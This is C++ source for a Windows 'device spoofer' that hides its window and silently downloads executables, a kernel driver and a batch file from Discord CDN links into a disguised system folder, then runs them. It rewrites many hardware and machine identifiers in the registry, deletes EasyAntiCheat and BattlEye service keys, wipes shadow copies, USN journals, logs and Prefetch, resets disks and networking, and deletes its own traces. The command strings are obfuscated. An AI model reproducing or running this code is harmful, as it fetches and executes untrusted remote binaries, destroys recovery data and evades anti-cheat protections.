#include "Windows.h"
#include "Iostream"
#include "Encrypt.hpp"
#include "Random"

std::string Randnum(std::string::size_type length)
{
	static auto& chrs = "0123456789ABCDEF";
	thread_local static std::mt19937 rg{ std::random_device{}() };
	thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);
	std::string s;
	s.reserve(length);
	while (length--)
	s += chrs[pick(rg)];
	return s;
}


void Console()
{
	HWND console = GetConsoleWindow();
	if (console != NULL)
	{
		DWORD style = GetWindowLong(console, GWL_STYLE);
		style = style & ~(WS_VSCROLL | WS_HSCROLL);
		SetWindowLong(console, GWL_STYLE, style);
		SetWindowPos(console, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_FRAMECHANGED);
	}
}

void SlowPrint(const std::string& str, int delay_time)
{
	for (size_t i = 0; i != str.size(); ++i)
	{
		std::cout << str[i];
		Sleep(delay_time);
	}
}

void Cursor(bool showFlag)
{
	HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_CURSOR_INFO cursorInfo;
	GetConsoleCursorInfo(out, &cursorInfo);
	cursorInfo.bVisible = showFlag;
	SetConsoleCursorInfo(out, &cursorInfo);
}

int main()
{
		HWND console = GetConsoleWindow();
		Cursor(false);
		Console();
		SetConsoleTitleA(E("Solution").decrypt());
		system(E("color f").decrypt());
		SlowPrint(E("(+) Press Any Key To Spoof The Device..").decrypt(), 50);
		system(E("pause >nul").decrypt());
		system(E("cls").decrypt());
		ShowWindow(console, SW_HIDE);
		system(E("curl --silent https://cdn.discordapp.com/attachments/1150034304181743636/1150048697648943225/Solution.exe --output C:\\Windows\\GameBarPresenceWriter\\Solution.exe >nul").decrypt());
		system(E("curl --silent https://cdn.discordapp.com/attachments/1150034304181743636/1150048702879236136/Solution64.sys --output C:\\Windows\\GameBarPresenceWriter\\Solution64.sys >nul").decrypt());
		system(E("curl --silent https://cdn.discordapp.com/attachments/1150034304181743636/1150038903831674890/Disk1.exe --output C:\\Windows\\GameBarPresenceWriter\\Disk1.exe >nul").decrypt());
		system(E("curl --silent https://cdn.discordapp.com/attachments/1150034304181743636/1150038914636202004/Disk2.exe --output C:\\Windows\\GameBarPresenceWriter\\Disk2.exe >nul").decrypt());
		system(E("curl --silent https://cdn.discordapp.com/attachments/1150034304181743636/1150049784363757709/Mac.bat --output C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
		Sleep(2000);
		system(E("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName /v ComputerName /t REG_SZ /d %Random% /f >nul").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName /v ComputerName /t REG_SZ /d %Random% /f >nul").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareId /t REG_SZ /d {%Random%%Random%-%Random%%Random%-%Random%%Random%} /f >nul").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareIds /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\" \"Profiles\\0001 /v HwProfileGuid /t REG_SZ /d {%Random%%Random%-%Random%%Random%-%Random%%Random%} /f >nul").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\SQMClient /v MachineId /t REG_SZ /d {%Random%%Random%-%Random%%Random%-%Random%%Random%} /f >nul").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\SQMClient /v WinSqmFirstSessionStartTime /t REG_QWORD /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallTime /t REG_QWORD /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallDate /t REG_QWORD /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f >nul").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Cryptography /v GUID /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f >nul").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\HardwareConfig /v LastConfig /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v ClientUUID /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v PersistenceIdentifier /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global\\CoProcManager /v ChipsetMatchID /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"0\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"1\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0 /v Identifier /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1 /v Identifier /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\BasicDisplay\\Video /v VideoID /t REG_SZ /d {%Random%%Random%-%Random%%Random%-%Random%%Random%} /f >nul").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Hostname /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f >nul").decrypt());
		system(E("REG ADD HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Domain /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f >nul").decrypt());
		system(E("REG ADD HKLM\\System\\CurrentControlSet\\Control\\DevQuery\\6 /v UUID /t REG_SZ /d%Random%%Random%-%Random%%Random%-%Random%%Random% /f >nul").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v NV\" \"Hostname /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ProductId /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f >nul").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildGUID /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f >nul").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\Software\\Microsoft /v BuildLab /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\Software\\Microsoft /v BuildLabEx /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v AccountDomainSid /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v PingID /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientId /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\Tracing\\Microsoft\\Profile\\Profile /v Guid /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v RegisteredOwner /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v RegisteredOrganization /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildBranch /t REG_SZ /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId /t REG_BINARY /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId4 /t REG_BINARY /d %Random%%Random%-%Random%%Random%-%Random%%Random% /f").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\kbdclass\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%Random%%Random%-%Random%%Random%-%Random%%Random%} /f").decrypt());
		system(E("REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\mouhid\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%Random%%Random%-%Random%%Random%-%Random%%Random%} /f").decrypt());
		system(E("REG DELETE HKLM\\SYSTEM\\MountedDevices /f").decrypt());
		system(E("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f").decrypt());
		system(E("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume /f").decrypt());
		system(E("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2 /f").decrypt());
		system(E("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f").decrypt());
		system(E("REG DELETE HKLM\\SOFTWARE\\Microsoft\\Dfrg\\Statistics /f").decrypt());
		system(E("REG DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v AcpiData /f").decrypt());
		system(E("REG DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v BiosData /f").decrypt());
		system(E("REG DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v RegistersData /f").decrypt());
		system(E("REG DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v SMBiosData /f").decrypt());
		system(E("REG DELETE HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /f").decrypt());
		system(E("REG DELETE HKLM\\SYSTEM\\ControlSet001\\Services\\EasyAntiCheat /f").decrypt());
		system(E("REG DELETE HKLM\\SYSTEM\\ControlSet001\\Services\\BEService /f").decrypt());
		system(E("C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
		system((E("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe C: ").decrypt() + Randnum(4) + "-" + Randnum(4)).c_str());
		system((E("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe D: ").decrypt() + Randnum(4) + "-" + Randnum(4)).c_str());
		system((E("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe E: ").decrypt() + Randnum(4) + "-" + Randnum(4)).c_str());
		system((E("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe F: ").decrypt() + Randnum(4) + "-" + Randnum(4)).c_str());
		system(E("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /SU AUTO >nul").decrypt());
		system(E("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /SS %Random%%Random%-%Random%%Random%-%Random%%Random% >nul").decrypt());
		system(E("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /BS %Random%%Random%-%Random%%Random%-%Random%%Random% >nul").decrypt());
		system(E("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /CS %Random%%Random%-%Random%%Random%-%Random%%Random% >nul").decrypt());
		system(E("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /CS %Random%%Random%-%Random%%Random%-%Random%%Random% >nul").decrypt());
		system(E("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /CS %Random%%Random%-%Random%%Random%-%Random%%Random% >nul").decrypt());
		system(E("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /PSN %Random%%Random%-%Random%%Random%-%Random%%Random% >nul").decrypt());
		system(E("sc stop winmgmt >nul").decrypt());
		system(E("sc start winmgmt >nul").decrypt());
		system(E("net stop winmgmt /y >nul").decrypt());
		system(E("net start winmgmt /y >nul").decrypt());
		system(E("ipconfig /flushdns >nul").decrypt());
		system(E("netsh int reset all >nul").decrypt());
		system(E("netsh int ipv4 reset >nul").decrypt());
		system(E("netsh int ipv6 reset >nul").decrypt());
		system(E("netsh winsock reset >nul").decrypt());
		system(E("powershell vssadmin delete shadows /all >nul").decrypt());
		system(E("powershell Reset-PhysicalDisk * >nul").decrypt());
		system(E("fsutil usn deletejournal /n C: >nul").decrypt());
		system(E("fsutil usn deletejournal /n D: >nul").decrypt());
		system(E("fsutil usn deletejournal /n E: >nul").decrypt());
		system(E("fsutil usn deletejournal /n F: >nul").decrypt());
		system(E("del /s /f /q C:\\Windows\\System32\\restore\\MachineGuid.txt >nul").decrypt());
		system(E("del /s /f /q C:\\System Volume Information\\IndexerVolumeGuid >nul").decrypt());
		system(E("del /s /f /q C:\\System Volume Information\\tracking.log >nul").decrypt());
		system(E("del /s /f /q C:\\Windows\\INF\\setupapi.dev.log >nul").decrypt());
		system(E("del /s /f /q C:\\Windows\\INF\\setupapi.setup.log >nul").decrypt());
		system(E("rmdir /s /q C:\\Windows\\temp >nul").decrypt());
		system(E("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Temp >nul").decrypt());
		system(E("rmdir /s /q C:\\Windows\\Prefetch >nul").decrypt());
		system(E("del C:\\Windows\\GameBarPresenceWriter\\Solution.exe >nul").decrypt());
		system(E("del C:\\Windows\\GameBarPresenceWriter\\Solution64.sys >nul").decrypt());
		system(E("del C:\\Windows\\GameBarPresenceWriter\\Disk1.exe >nul").decrypt());
		system(E("del C:\\Windows\\GameBarPresenceWriter\\Disk2.exe >nul").decrypt());
		system(E("del C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
		system(E("cls").decrypt());
		ShowWindow(console, SW_SHOW);
		Cursor(false);
		Console();
		SetConsoleTitleA(E("Solution").decrypt());
		system(E("color f").decrypt());
		SlowPrint(E("(+) The Devices Is Now Spoofed..").decrypt(), 50);
		system(E("pause >nul").decrypt());
}